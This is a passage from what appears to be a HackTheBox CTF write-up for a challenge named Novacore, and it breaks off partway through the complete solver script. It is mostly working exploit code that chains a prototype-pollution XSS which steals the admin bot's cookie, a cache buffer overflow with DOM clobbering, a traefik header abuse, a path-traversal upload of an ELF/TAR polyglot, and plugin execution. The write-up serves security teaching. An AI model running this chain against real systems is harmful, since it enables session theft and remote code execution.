</span></span><span style="display:flex;"><span>    [<span style="color:#e6db74">&#34;docker&#34;</span>, <span style="color:#e6db74">&#34;ps&#34;</span>, <span style="color:#e6db74">&#34;--filter&#34;</span>, <span style="color:#e6db74">&#34;name=nova&#34;</span>, <span style="color:#e6db74">&#34;--quiet&#34;</span>], text<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>)<span style="color:#f92672">.</span>strip()
</span></span></code></pre></div><p>We used <code>--quiet</code> and filtered by <code>nova</code> to get the id of the Novacore container I am running locally.</p>
<p>Let&rsquo;s write and compile the plugin on the container we identified:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>plugin_code <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;main(){ system(&#34;cat /flag*&#34;); }&#39;</span>
</span></span><span style="display:flex;"><span>plugin_compile <span style="color:#f92672">=</span> (
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;echo &#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39; &gt; /tmp/plugin.c; gcc /tmp/plugin.c -o /tmp/plugin 2&gt;/dev/null&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">%</span> plugin_code
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>subprocess<span style="color:#f92672">.</span>check_call(
</span></span><span style="display:flex;"><span>    [<span style="color:#e6db74">&#34;docker&#34;</span>, <span style="color:#e6db74">&#34;exec&#34;</span>, <span style="color:#e6db74">&#34;-t&#34;</span>, container_id, <span style="color:#e6db74">&#34;bash&#34;</span>, <span style="color:#e6db74">&#34;-c&#34;</span>, plugin_compile], text<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>)
</span></span></code></pre></div><p>Nice! This should write the plugin to <code>/tmp/plugin.c</code> and compile it to <code>/tmp/plugin</code>.</p>
<p>Next, let&rsquo;s exfiltrate it, a safe way to grab the binary, is to encode it as base64 (I tried reading the bytes directly into python but that failed for some reason):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>plugin_encode <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;base64 -w0 /tmp/plugin&#34;</span>
</span></span><span style="display:flex;"><span>plugin_base64 <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>check_output(
</span></span><span style="display:flex;"><span>    [<span style="color:#e6db74">&#34;docker&#34;</span>, <span style="color:#e6db74">&#34;exec&#34;</span>, <span style="color:#e6db74">&#34;-t&#34;</span>, container_id, <span style="color:#e6db74">&#34;bash&#34;</span>, <span style="color:#e6db74">&#34;-c&#34;</span>, plugin_encode], text<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>)<span style="color:#f92672">.</span>strip()
</span></span></code></pre></div><p>Next, we will make sure to decode the encoded binary and modify it at offset 0x101 to make it an ELF/TAR polyglot:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>plugin_bytes <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(plugin_base64)
</span></span><span style="display:flex;"><span>plugin_bytes <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>BytesIO(plugin_bytes)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">3. Crafting ELF/TAR polyglot&#34;</span>)
</span></span><span style="display:flex;"><span>tar_magic <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;ustar</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>plugin_bytes<span style="color:#f92672">.</span>seek(<span style="color:#ae81ff">0x101</span>)
</span></span><span style="display:flex;"><span>plugin_bytes<span style="color:#f92672">.</span>write(tar_magic)
</span></span><span style="display:flex;"><span>plugin_bytes <span style="color:#f92672">=</span> plugin_bytes<span style="color:#f92672">.</span>getvalue()
</span></span></code></pre></div><p>With the executable in hand, let&rsquo;s set <code>front_end_error</code> to serve our prototype pollution to XSS payload:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>api <span style="color:#f92672">=</span> httpx<span style="color:#f92672">.</span>Client(base_url<span style="color:#f92672">=</span>url, headers<span style="color:#f92672">=</span>dict(Connection<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;close, X-Real-Ip&#34;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>xss <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;fetch(&#39;/front_end_error/new/exfill&#39;, {method: &#39;POST&#39;, headers: {&#39;Content-Type&#39;: &#39;application/json&#39;}, body: JSON.stringify(document.cookie)})&#34;</span>
</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> api<span style="color:#f92672">.</span>post(
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;/front_end_error/new/xss&#34;</span>,
</span></span><span style="display:flex;"><span>    json<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;__proto__&#34;</span>: {<span style="color:#e6db74">&#34;length&#34;</span>: <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">//&#34;</span> <span style="color:#f92672">%</span> xss}},
</span></span><span style="display:flex;"><span>)
</span></span></code></pre></div><p>Notice the <code>Connection</code> header we attached to this client to abuse the <code>traefik</code> CVE identified earlier.</p>
<p>With the XSS read to be served, let&rsquo;s poison the bot&rsquo;s trades feed to execute our XSS. First, let&rsquo;s query active signals:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>signals <span style="color:#f92672">=</span> api<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/api/active_signals&#34;</span>)<span style="color:#f92672">.</span>json()[<span style="color:#e6db74">&#34;signals&#34;</span>]
</span></span><span style="display:flex;"><span>signal_key <span style="color:#f92672">=</span> signals[<span style="color:#ae81ff">0</span>][<span style="color:#e6db74">&#34;key&#34;</span>]
</span></span></code></pre></div><p>We need to copy any active signal, I will be using the first one and copy it until we have two trades:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">while</span> len(trades <span style="color:#f92672">:=</span> api<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;/api/trades&#34;</span>)<span style="color:#f92672">.</span>json()[<span style="color:#e6db74">&#34;trades&#34;</span>]) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>:
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> api<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#34;/api/copy_signal_trade&#34;</span>, json<span style="color:#f92672">=</span>dict(signal_id<span style="color:#f92672">=</span>signal_key))
</span></span></code></pre></div><p>We can then edit the first of the two trades to overflow it onto the second. This part is tricky as we need to craft a precise payload with all paddings calculated precisely:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># we target the first trade</span>
</span></span><span style="display:flex;"><span>trade <span style="color:#f92672">=</span> trades[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># reusing the same format_trade function for the app</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">format_trade</span>(trade):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;symbol|</span><span style="color:#e6db74">{</span>trade[<span style="color:#e6db74">&#39;symbol&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">|action|</span><span style="color:#e6db74">{</span>trade[<span style="color:#e6db74">&#39;action&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">|price|</span><span style="color:#e6db74">{</span>trade[<span style="color:#e6db74">&#39;price&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># getting the trade&#39;s existing value</span>
</span></span><span style="display:flex;"><span>trade_str <span style="color:#f92672">=</span> format_trade(trade[<span style="color:#e6db74">&#34;data&#34;</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># we will be placing our overflow in the price section</span>
</span></span><span style="display:flex;"><span>trade_prefix <span style="color:#f92672">=</span> trade_str[: trade_str<span style="color:#f92672">.</span>rfind(<span style="color:#e6db74">&#34;|&#34;</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span><span style="color:#75715e"># we DOM clobber the three properties discussed earlier</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># we replace spaces with / which is valid HTML to not</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># break the cache low-level `set` command</span>
</span></span><span style="display:flex;"><span>html_injection <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;&lt;img/name=getElementById&gt;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">&lt;a/id=UI_DEV_MODE&gt;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">&lt;a/id=&#34;LOG_LEVEL&#34;/int=&#34;../view/xss&#34;&gt;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># we create a key with user:1:trade: prefix so it</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># gets served to the bot</span>
</span></span><span style="display:flex;"><span>spoofed_key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;user:1:trade:aelmo&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># we put our HTML injection under symbol, action and price work too</span>
</span></span><span style="display:flex;"><span>spoofed_val <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;symbol|</span><span style="color:#e6db74">{</span>html_injection<span style="color:#e6db74">}</span><span style="color:#e6db74">|action|buy|price|761.01&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> len(spoofed_val) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">256</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># we fill the value of 1st trade up to 256 then write key of 2nd trade</span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#ae81ff">256</span> <span style="color:#f92672">-</span> len(trade_prefix)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># we fill the key of the 2nd trade up to 256 then write its value</span>
</span></span><span style="display:flex;"><span>padding2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">256</span> <span style="color:#f92672">-</span> len(spoofed_key)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> padding <span style="color:#f92672">+</span> spoofed_key <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> padding2 <span style="color:#f92672">+</span> spoofed_val
</span></span></code></pre></div><p>With our payload crafted, let&rsquo;s send it to <code>/api/edit_trade</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>r <span style="color:#f92672">=</span> api<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#34;/api/edit_trade&#34;</span>, json<span style="color:#f92672">=</span>dict(trade_id<span style="color:#f92672">=</span>trade[<span style="color:#e6db74">&#34;key&#34;</span>], price<span style="color:#f92672">=</span>payload))
</span></span></code></pre></div><p>If all is good, the bot&rsquo;s feed should be poisoned at this point, let us wait for around a minute, then check our exfiltrated cookie session:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">60</span>)
</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> api<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#34;/front_end_error/view/exfill&#34;</span>, json<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>session <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>json()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;=&#34;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
</span></span></code></pre></div><p>With this session in hand, we can now craft a new <code>admin</code> client:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>admin <span style="color:#f92672">=</span> httpx<span style="color:#f92672">.</span>Client(base_url<span style="color:#f92672">=</span>url, cookies<span style="color:#f92672">=</span>dict(session<span style="color:#f92672">=</span>session))
</span></span></code></pre></div><p>As an admin, let&rsquo;s upload a dataset abusing the insecure path join we found earlier. The dataset contains our ELF polyglot:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>plugin_name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;getflag.tar&#34;</span>
</span></span><span style="display:flex;"><span>plugin_dir <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/app/application/plugins/&#34;</span>
</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> admin<span style="color:#f92672">.</span>post(
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;/upload_dataset&#34;</span>,
</span></span><span style="display:flex;"><span>    files<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;dataset_file&#34;</span>: (plugin_dir <span style="color:#f92672">+</span> plugin_name, plugin_bytes)},
</span></span><span style="display:flex;"><span>)
</span></span></code></pre></div><p>Next, we simply execute the uploaded plugin using its name:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>r <span style="color:#f92672">=</span> admin<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#34;/run_plugin&#34;</span>, data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;plugin&#34;</span>: plugin_name})
</span></span></code></pre></div><p>And grab our flag from the response!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>print(re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;HTB{.+?}&#34;</span>, r<span style="color:#f92672">.</span>text)<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">0</span>))
</span></span></code></pre></div><h2 id="finale-complete-solver--conclusion">Finale: Complete Solver + Conclusion<a href="#finale-complete-solver--conclusion" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>Here is the complete script with prints, basic error handling and some polish:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> rich <span style="color:#f92672">import</span> print
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> subprocess
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> httpx
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> io
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">format_trade</span>(trade):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;symbol|</span><span style="color:#e6db74">{</span>trade[<span style="color:#e6db74">&#39;symbol&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">|action|</span><span style="color:#e6db74">{</span>trade[<span style="color:#e6db74">&#39;action&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">|price|</span><span style="color:#e6db74">{</span>trade[<span style="color:#e6db74">&#39;price&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>plugin_code <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;main(){ system(&#34;cat /flag*&#34;); }&#39;</span>
</span></span><span style="display:flex;"><span>plugin_compile <span style="color:#f92672">=</span> (
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;echo &#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39; &gt; /tmp/plugin.c; gcc /tmp/plugin.c -o /tmp/plugin 2&gt;/dev/null&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">%</span> plugin_code
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>plugin_encode <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;base64 -w0 /tmp/plugin&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;1. Getting local container id&#34;</span>)
</span></span><span style="display:flex;"><span>container_id <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>check_output(
</span></span><span style="display:flex;"><span>    [<span style="color:#e6db74">&#34;docker&#34;</span>, <span style="color:#e6db74">&#34;ps&#34;</span>, <span style="color:#e6db74">&#34;--filter&#34;</span>, <span style="color:#e6db74">&#34;name=nova&#34;</span>, <span style="color:#e6db74">&#34;--quiet&#34;</span>], text<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>)<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> len(container_id) <span style="color:#f92672">==</span> <span style="color:#ae81ff">12</span>, <span style="color:#e6db74">&#34;[-] Failed to get container_id&#34;</span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">+ </span><span style="color:#e6db74">{</span>container_id<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">2. Compiling custom plugin in target environment&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">* Plugin code:&#34;</span>, plugin_code)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">* Compiling on target environment&#34;</span>)
</span></span><span style="display:flex;"><span>subprocess<span style="color:#f92672">.</span>check_call(
</span></span><span style="display:flex;"><span>    [<span style="color:#e6db74">&#34;docker&#34;</span>, <span style="color:#e6db74">&#34;exec&#34;</span>, <span style="color:#e6db74">&#34;-t&#34;</span>, container_id, <span style="color:#e6db74">&#34;bash&#34;</span>, <span style="color:#e6db74">&#34;-c&#34;</span>, plugin_compile], text<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">* Reading base64-encoded executable from target environment&#34;</span>)
</span></span><span style="display:flex;"><span>plugin_base64 <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>check_output(
</span></span><span style="display:flex;"><span>    [<span style="color:#e6db74">&#34;docker&#34;</span>, <span style="color:#e6db74">&#34;exec&#34;</span>, <span style="color:#e6db74">&#34;-t&#34;</span>, container_id, <span style="color:#e6db74">&#34;bash&#34;</span>, <span style="color:#e6db74">&#34;-c&#34;</span>, plugin_encode], text<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>)<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">+ Compiled successfully&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>plugin_bytes <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(plugin_base64)
</span></span><span style="display:flex;"><span>plugin_bytes <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>BytesIO(plugin_bytes)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">3. Crafting ELF/TAR polyglot&#34;</span>)
</span></span><span style="display:flex;"><span>tar_magic <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;ustar</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>plugin_bytes<span style="color:#f92672">.</span>seek(<span style="color:#ae81ff">0x101</span>)
</span></span><span style="display:flex;"><span>plugin_bytes<span style="color:#f92672">.</span>write(tar_magic)
</span></span><span style="display:flex;"><span>plugin_bytes <span style="color:#f92672">=</span> plugin_bytes<span style="color:#f92672">.</span>getvalue()
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">+ polyglot crafted successfully&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://localhost:1338&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># url = &#34;http://94.237.48.197:47119&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>api <span style="color:#f92672">=</span> httpx<span style="color:#f92672">.</span>Client(base_url<span style="color:#f92672">=</span>url, headers<span style="color:#f92672">=</span>dict(Connection<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;close, X-Real-Ip&#34;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">4. Sending XSS via PP payload to /front_end_error&#34;</span>)
</span></span><span style="display:flex;"><span>xss <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;fetch(&#39;/front_end_error/new/exfill&#39;, {method: &#39;POST&#39;, headers: {&#39;Content-Type&#39;: &#39;application/json&#39;}, body: JSON.stringify(document.cookie)})&#34;</span>
</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> api<span style="color:#f92672">.</span>post(
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;/front_end_error/new/xss&#34;</span>,
</span></span><span style="display:flex;"><span>    json<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;__proto__&#34;</span>: {<span style="color:#e6db74">&#34;length&#34;</span>: <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">//&#34;</span> <span style="color:#f92672">%</span> xss}},
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> {<span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Error logged&#34;</span>} <span style="color:#f92672">==</span> r<span style="color:#f92672">.</span>json()
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">+ XSS payload set successfully&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">5. Retrieving active signal key&#34;</span>)
</span></span><span style="display:flex;"><span>signals <span style="color:#f92672">=</span> api<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/api/active_signals&#34;</span>)<span style="color:#f92672">.</span>json()[<span style="color:#e6db74">&#34;signals&#34;</span>]
</span></span><span style="display:flex;"><span>signal_key <span style="color:#f92672">=</span> signals[<span style="color:#ae81ff">0</span>][<span style="color:#e6db74">&#34;key&#34;</span>]
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">+&#34;</span>, signal_key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">6. Retrieving target trade&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> len(trades <span style="color:#f92672">:=</span> api<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;/api/trades&#34;</span>)<span style="color:#f92672">.</span>json()[<span style="color:#e6db74">&#34;trades&#34;</span>]) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>:
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> api<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#34;/api/copy_signal_trade&#34;</span>, json<span style="color:#f92672">=</span>dict(signal_id<span style="color:#f92672">=</span>signal_key))
</span></span><span style="display:flex;"><span>trade <span style="color:#f92672">=</span> trades[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">+ Copied two trades as sys_admin&#34;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">+ trade 1 =&#34;</span>, trades[<span style="color:#ae81ff">0</span>][<span style="color:#e6db74">&#34;key&#34;</span>])
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">+ trade 2 =&#34;</span>, trades[<span style="color:#ae81ff">1</span>][<span style="color:#e6db74">&#34;key&#34;</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">7. Buffer overflowing trade 1 onto trade 2&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>trade_str <span style="color:#f92672">=</span> format_trade(trade[<span style="color:#e6db74">&#34;data&#34;</span>])
</span></span><span style="display:flex;"><span>trade_prefix <span style="color:#f92672">=</span> trade_str[: trade_str<span style="color:#f92672">.</span>rfind(<span style="color:#e6db74">&#34;|&#34;</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>html_injection <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;&lt;img/name=getElementById&gt;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">&lt;a/id=UI_DEV_MODE&gt;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">&lt;a/id=&#34;LOG_LEVEL&#34;/int=&#34;../view/xss&#34;&gt;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>spoofed_key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;user:1:trade:aelmo&#34;</span>
